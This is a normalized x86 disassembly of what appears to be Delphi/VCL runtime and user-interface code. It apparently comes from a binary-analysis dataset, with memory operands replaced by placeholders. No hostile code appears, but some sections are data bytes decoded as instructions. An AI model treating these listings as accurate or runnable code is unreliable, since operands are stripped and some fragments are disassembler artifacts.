retn
sub_44a7f8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a80c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a820
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a834
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a848
retn
sub_44a84c
retn
sub_44a850
retn
sub_44a854
retn
sub_44a858
retn
sub_44a85c
retn
sub_44a860
retn
sub_44a864
retn
sub_44a868
retn
sub_44a86c
retn
sub_44a870
retn
sub_44a874
retn
sub_44ab20
jmp sub_4039e4
sub_44aebc
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x90 ] eax
sub_44aee4
push esi
mov si 0xffef
call sub_40348c
pop esi
retn
sub_44af85
jmp sub_4039e4
sub_44af8c
pop ebp
retn
sub_44af90
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
sub_44b1b8
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44b391
jmp sub_4039e4
sub_44b398
pop ebx
pop ecx
pop ebp
retn
sub_44b39c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44b3a4
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44b60c
sub_44b451
jmp sub_4039e4
sub_44b458
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403290
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44b560
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44b69f
jmp sub_4039e4
sub_44b6a6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b73e
jmp sub_4039e4
sub_44b745
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b762
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_44b75b
jmp sub_4039e4
sub_44b762
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b839
jmp sub_4039e4
sub_44b877
jmp sub_4039e4
sub_44b87e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ba43
jmp sub_4039e4
sub_44ba4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ba67
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_44ba60
jmp sub_4039e4
sub_44ba67
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44bae0
retn
sub_44ba80
jmp sub_4039e4
sub_44bacf
jmp sub_4039e4
sub_44bad6
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44bb5f
jmp sub_4039e4
sub_44bb66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bb6c
or edx 0xffffffff
call sub_44bae0
retn
sub_44bf7b
jmp sub_4039e4
sub_44bf82
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bf9f
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_44bf98
jmp sub_4039e4
sub_44bf9f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bfbc
mov eax [ ebp - 0x4 ]
call sub_44cab4
retn
sub_44bfb5
jmp sub_4039e4
sub_44bfbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c1c0
jmp sub_4039e4
sub_44c1c7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c1cc
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_40348c
sub_44c1e4
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412618
pop ebx
retn
sub_44c288
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413918
sub_44c39f
jmp sub_4039e4
sub_44c3a6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_44c3bc
jmp sub_4039e4
sub_44c6ce
jmp sub_4039e4
sub_44c6d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c6f2
mov eax [ ebp - 0x10 ]
call sub_403290
retn
sub_44c6eb
jmp sub_4039e4
sub_44c6f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c70f
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_44c708
jmp sub_4039e4
sub_44c70f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c778
jmp sub_4039e4
sub_44c891
jmp sub_4039e4
sub_44c8ae
jmp sub_4039e4
sub_44ca66
jmp sub_4039e4
sub_44ca6d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44cab0
inc [ eax + 0x5c ]
retn
sub_44cab4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_40348c
sub_44cb08
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44cb45
jmp sub_4039e4
sub_44cb4c
pop ebp
retn
sub_44cb50
sub [ rw-data ] 0x1
retn
sub_44cef6
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x41ffbb31 ] dl
iretd
sub_44d93e

sub_44da5b
jmp [ eax + eax ]
sub_44dab8
mov eax [ esp + 0x8 ]
retn
sub_44dac0
push ebx
mov ebx eax
call sub_44dab8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
jmp sub_403a1c
sub_44dadc
pop ebx
retn
sub_44dd55
jmp sub_4039e4
sub_44dd5c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44dea7
jmp sub_4039e4
sub_44deae
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44dec4
push ebx
mov eax [ rw-data ]
call sub_413f8c
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413f48
mov eax ebx
pop ebx
retn
sub_44e04c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44e068
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44e763
jmp sub_4039e4
sub_44e76a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e862
jmp sub_4039e4
sub_44e869
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ec8c
jmp sub_4039e4
sub_44ec93
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44f13f
jmp sub_4039e4
sub_44f5e0
jmp sub_4039e4
sub_44f5e7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fa4b
jmp sub_4039e4
sub_44ff08
jmp sub_4039e4
sub_44ff0f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4502ba
jmp sub_4039e4
sub_4502c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4502cf
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45047c
mov eax [ r-xdata ]
retn
sub_4504b8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4504cc
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4504dc
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4504ec
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_4507e8
mov edx eax
sub_450584
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403440
mov edx esi
call sub_450504
pop esi
pop ebx
retn
sub_450600
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4507e8
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413ad0
mov ecx eax
sub_4509d8
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_450a40
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_450de8
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_450e1c
sub_450e1c
mov edx sub_450df4
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44df44
retn
sub_451006
jmp sub_4039e4
sub_45100d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4514a4
jmp sub_4039e4
sub_4514e3
jmp sub_4039e4
sub_4514ea
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451688
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4517c4
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_40348c
pop esi
pop ebp
retn 0x8
sub_4517e0
mov eax [ eax + 0x34 ]
call sub_44ea18
retn
sub_4517ec
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_40348c
pop esi
retn
sub_451828
push ebx
mov ecx sub_451800
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44df44
pop ebx
retn
sub_451a5c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_451a70
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_451ba5
jmp sub_403730
sub_451ca7
jmp sub_4039e4
sub_451cd2
jmp sub_4039e4
sub_451cd9
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_451cf0
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_451ed8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_451828
sub_451f58
jmp sub_4039e4
sub_451f9c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_451fb4
push ebx
mov ebx eax
mov eax ebx
call sub_41987c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_452006
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_451828
sub_45207c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4521c5
jmp sub_4039e4
sub_4521cc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45240c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45241c
sub_452470
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_452480
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_452490
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4524a0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_4524b0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_452528
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44e870
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44e870
retn
sub_452544
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44e870
sub_45258c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_4517e0
retn
mov eax edx
retn
j_sub_403730#8
jmp sub_403730
sub_4525cb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e194
call sub_403a98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452931
jmp sub_4039e4
sub_452938
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403290
retn
sub_45294e
jmp sub_4039e4
sub_452a4f
jmp sub_4039e4
sub_452a56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452a73
mov eax [ ebp - 0x14 ]
call sub_403290
retn
sub_452a6c
jmp sub_4039e4
sub_452a91
jmp sub_4039e4
sub_452b1b
jmp sub_4039e4
sub_452b22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452b54
push ebx
mov ebx eax
mov eax ebx
call sub_413bb8
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41a62c
sub_452c18
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_452c2c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_452c34
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_452ff9
jmp sub_4039e4
sub_453000
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453100
jmp sub_4039e4
sub_453107
pop ebp
retn
sub_453ab8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_454f48
mov eax [ rw-data ]
retn
sub_454f50
mov [ rw-data ] eax
retn
j_sub_403730#7
jmp sub_403730
sub_4550cf
jmp sub_4039e4
sub_4550d6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4553de
jmp sub_4039e4
sub_4553e5
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_455489
jmp sub_4039e4
sub_455490
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455520
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_455c4c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4562f8
sub_455c68
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_455c4c
sub_455d88
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4562f8
sub_455da0
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4562f8
sub_455db8
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_4562f8
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_455de4
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_455df0
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_4562f8
retn
sub_4560d0
push ebx
mov ebx edx
mov edx ebx
call sub_4417f4
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_456140
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_456268
jmp sub_4039e4
sub_45626f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456278
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_455684
mov eax [ ebx + 0x20c ]
call sub_455684
sub_4562d8
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4562e8
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4563e3
jmp sub_4039e4
sub_4563f0
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_456408
sub_456624
retn
sub_456692
jmp sub_4039e4
sub_4566d1
jmp sub_4039e4
sub_456704
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_442cec
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_455910
retn
sub_456728
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_442d0c
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_455910
retn
sub_45681d
jmp sub_4039e4
sub_456824
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_455578
mov eax [ ebp - 0x4 ]
call sub_4562f8
sub_456958
jmp sub_4039e4
sub_456990
jmp sub_4039e4
sub_456997
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4569b7
lea eax [ ebp - 0x114 ]
call sub_403fe0
retn
sub_4569b0
jmp sub_4039e4
sub_4569b7
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_456cbe
jmp sub_4039e4
sub_456cc5
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403604
j_sub_403730#9
jmp sub_403730
sub_456d95
jmp sub_403730
sub_456d9a
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e194
call sub_403a98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457152
jmp sub_4039e4
sub_457159
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457234
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41780c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_45724c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457284
mov edx eax
mov eax esi
call sub_419094
pop esi
pop ebx
retn
sub_457268
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458628
mov edx eax
mov eax esi
call sub_419094
pop esi
pop ebx
retn
sub_457284
push ebx
mov ebx eax
mov eax ebx
call sub_4582c8
mov edx r-xdata
call sub_41d5d8
pop ebx
retn
sub_457388
push ebx
mov ebx eax
mov eax ebx
call sub_457398
xor al 0x1
pop ebx
retn
sub_457398
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4573f4
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_457414
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_457434
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_45772d
jmp sub_4039e4
sub_457734
pop ecx
pop ebp
retn
sub_457738
xor eax eax
retn
sub_457a10
jmp sub_4039e4
sub_457a17
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_457a2d
jmp sub_4039e4
sub_457b17
jmp sub_4039e4
sub_457b1e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b3b
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_457b34
jmp sub_4039e4
sub_457b5b
jmp sub_4039e4
sub_457e46
jmp sub_4039e4
sub_457fd9
jmp sub_4039e4
sub_4582c8
mov eax [ eax + 0x238 ]
retn
sub_4582d0
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4582dc
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45861a
jmp sub_4039e4
sub_458621
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458628
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_458670
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_441f08
sub_45868c
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_4586c8
push ebx
mov ebx eax
mov eax ebx
call sub_443e9c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41cf14
sub_45874c
push ebx
mov ebx eax
mov eax ebx
call sub_443ec4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41d67c
sub_45876c
push ebx
mov ebx eax
mov eax ebx
call sub_45838c
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_458454
pop ebx
retn
sub_458f99
lea eax [ ebp - 0xb4 ]
call sub_403fe0
retn
sub_458fa5
jmp sub_4039e4
j_sub_458f99
jmp sub_458f99
sub_458fac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459104
jmp sub_4039e4
sub_45910b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4593f0
jmp sub_4039e4
sub_4593f7
mov eax [ rw-data ]
call sub_45bca8
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45940e
add [ eax ] al
retn
sub_45966c
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45968c
mov eax [ eax + 0x240 ]
call sub_423108
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45da48
sub_459733
jmp sub_4039e4
sub_45973a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45975d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d654
retn
sub_459756
jmp sub_4039e4
sub_45975d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45991c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45968c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_459b84
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_451994
sub_459c6f
jmp sub_4039e4
sub_459c76
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459c7c
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_459464
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_459cd4
call sub_45a9fc
retn
sub_45a121
jmp sub_4039e4
sub_45a128
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403730#6
jmp sub_403730
sub_45a7c0
jmp sub_403730
sub_45a8b9
jmp sub_4039e4
sub_45a8c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a8dd
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
sub_45a8d6
jmp sub_4039e4
sub_45a8dd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45a8e4
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_423108
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45732c
sub_45a904
call sub_403290
retn
sub_45a95c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45a9c2
jmp sub_4039e4
j_sub_403730#5
jmp sub_403730
sub_45ab9c
xor edx edx
call sub_457690
retn
sub_45aba4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_457690
mov eax ebx
call sub_43e3ac
pop ebx
retn
sub_45ac2a
jmp sub_4039e4
sub_45ac31
pop ebx
pop ecx
pop ebp
retn
sub_45ac38
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_444968
push eax
call PostMessageA
pop ebx
retn
sub_45ae3c
jmp sub_4039e4
sub_45aedd
jmp sub_4039e4
sub_45aee7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af06
mov eax [ rw-data ]
call sub_45d120
retn
sub_45aeff
jmp sub_4039e4
sub_45af06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af23
lea eax [ ebp - 0x20 ]
call sub_403fe0
retn
sub_45af1c
jmp sub_4039e4
sub_45af23
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b004
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43d558
retn
mov edx eax
mov eax [ rw-data ]
call sub_45c774
retn
sub_45b388
mov edx eax
mov eax [ rw-data ]
call sub_45e194
mov al 0x1
retn
sub_45b470
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45b398
sub_45b484
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45b398
sub_45b498
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45b398
sub_45b4ac
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45b398
sub_45b4c0
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
